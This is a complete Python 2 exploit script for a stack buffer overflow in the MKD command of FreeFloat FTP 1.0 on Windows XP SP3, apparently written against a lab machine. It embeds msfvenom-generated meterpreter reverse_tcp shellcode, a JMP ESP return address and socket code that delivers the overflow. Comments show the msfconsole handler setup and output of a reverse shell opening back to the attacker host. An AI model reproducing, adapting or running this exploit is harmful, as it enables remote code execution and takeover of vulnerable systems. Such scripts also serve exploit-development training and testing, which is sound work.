#!/usr/bin/python2

#---------------------------------------------------------------------------------------------------#
# Exploit: FreeFloat FTP 1.0 (MKD BOF)                                                              #
# OS: Windows XP Professional SP3 Build 2600                                                        #
# Architecture: x86                                                                                 #
#---------------------------------------------------------------------------------------------------#
# msfconsole -x "use exploit/multi/handler;\                                                        #
# set PAYLOAD windows/meterpreter/reverse_tcp;\                                                     # 
# set LHOST 192.168.1.160;\                                                                         #
# set LPORT 4444;\                                                                                  #
# run"                                                                                              #
# [*] Using configured payload generic/shell_reverse_tcp                                            #
# PAYLOAD => windows/meterpreter/reverse_tcp                                                        #
# LHOST => 192.168.1.160                                                                            #
# LPORT => 4444                                                                                     #
# [*] Started reverse TCP handler on 192.168.1.160:4444                                             #
# [*] Sending stage (175174 bytes) to 192.168.1.82                                                  #
# [*] Meterpreter session 1 opened (192.168.1.160:4444 -> 192.168.1.82:1090 ) ...                   #
#                                                                                                   #
# meterpreter > shell                                                                               #
# Process 1172 created.                                                                             #
# Channel 1 created.                                                                                #
# Microsoft Windows XP [Version 5.1.2600]                                                           #
# (C) Copyright 1985-2001 Microsoft Corp.                                                           #
#                                                                                                   #
# C:\                                                                                               #
#---------------------------------------------------------------------------------------------------#


import socket
import sys

#---------------------------------------------------------------------------------------------------#
# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.160 LPORT=4444 -f c -b '\x00\x0a\x0d' #
# x86/shikata_ga_nai succeeded with size 381 (iteration=0)                                          #
#---------------------------------------------------------------------------------------------------#

shellcode = ("\xdb\xd4\xbe\x74\xec\x98\x42\xd9\x74\x24\xf4\x5b\x29\xc9\xb1"
"\x59\x83\xc3\x04\x31\x73\x15\x03\x73\x15\x96\x19\x64\xaa\xd9"
"\xe2\x95\x2b\x85\xd3\x47\x4f\xce\x46\x58\x19\x35\xed\xca\x15"
"\x3e\xa0\xfe\x14\xbf\xce\x8d\x7e\x30\x66\x3b\x59\x7f\x48\x10"
"\x99\x1e\x34\x6b\xce\xc0\x05\xa4\x03\x01\x41\x72\x69\xee\x1f"
"\xd2\x1a\xa2\x8f\x57\x5e\x7e\xb1\xb7\xd4\x3e\xc9\xb2\x2b\xca"
"\x65\xbc\x7b\x62\xfd\xf6\x63\x09\x59\x27\x95\xde\xdf\xee\xe1"
"\xdc\x96\xc1\xf6\x97\x1d\xa9\x08\x71\x6c\x6d\xcb\xb2\x82\xc1"
"\xcd\x8b\xa5\xf9\xbb\xe7\xd5\x84\xbb\x3c\xa7\x52\x49\xa2\x0f"
"\x10\xe9\x06\xb1\xf5\x6c\xcd\xbd\xb2\xfb\x89\xa1\x45\x2f\xa2"
"\xde\xce\xce\x64\x57\x94\xf4\xa0\x33\x4e\x94\xf1\x99\x21\xa9"
"\xe1\x46\x9d\x0f\x6a\x64\xc8\x30\x93\x76\xf5\x6c\x03\xba\x38"
"\x8f\xd3\xd4\x4b\xfc\xe1\x7b\xe0\x6a\x49\xf3\x2e\x6c\xd8\x13"
"\xd1\xa2\x62\x73\x2f\x43\x92\x5d\xf4\x17\xc2\xf5\xdd\x17\x89"
"\x05\xe1\xcd\x27\x0c\x75\x2e\x1f\x11\x25\xc6\x5d\x12\x34\x4b"
"\xe8\xf4\x66\x23\xba\xa8\xc6\x93\x7a\x19\xaf\xf9\x75\x46\xcf"
"\x01\x5c\xef\x7a\xee\x08\x47\x13\x97\x11\x13\x82\x58\x8c\x59"
"\x84\xd3\x24\x9d\x4b\x14\x4d\x8d\xbc\x43\xad\x4d\x3d\xe6\xad"
"\x27\x39\xa0\xfa\xdf\x43\x95\xcc\x7f\xbb\xf0\x4f\x87\x43\x85"
"\x79\xf3\x72\x13\xc5\x6b\x7b\xf3\xc5\x6b\x2d\x99\xc5\x03\x89"
"\xf9\x96\x36\xd6\xd7\x8b\xea\x43\xd8\xfd\x5f\xc3\xb0\x03\xb9"
"\x23\x1f\xfc\xec\x37\x58\x02\x72\x10\xc1\x6a\x8c\x20\xf1\x6a"
"\xe6\xa0\xa1\x02\xfd\x8f\x4e\xe2\xfe\x05\x07\x6a\x74\xc8\xe5"
"\x0b\x89\xc1\xa8\x95\x8a\xe6\x70\x26\xf0\x87\x87\xc7\x05\x8e"
"\xe3\xc8\x05\xae\x15\xf5\xd3\x97\x63\x38\xe0\xa3\x7c\x0f\x45"
"\x85\x16\x6f\xd9\xd5\x32")

#---------------------------------------------------------------------------------------------------#
# badchars: \x00\x0a\x0d                                                                            #
# 0x7c9d30d7: jmp esp | SHELL32.dll                                                                 #
# shellcode at ESP (space = 749 bytes)                                                              #
#---------------------------------------------------------------------------------------------------#

buffer = "\x90"*20 + shellcode
payload = "A"*247 + "\xd7\x30\x9d\x7c" + buffer + "C"*(749-len(buffer))
 
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('192.168.1.82', 21))
 
s.recv(1024)
s.send('USER anonymous\r\n')
s.recv(1024)
s.send('PASS anonymous\r\n')
s.recv(1024)
s.send('MKD ' + payload + '\r\n')
s.recv(1024)
s.send('QUIT\r\n')
s.close

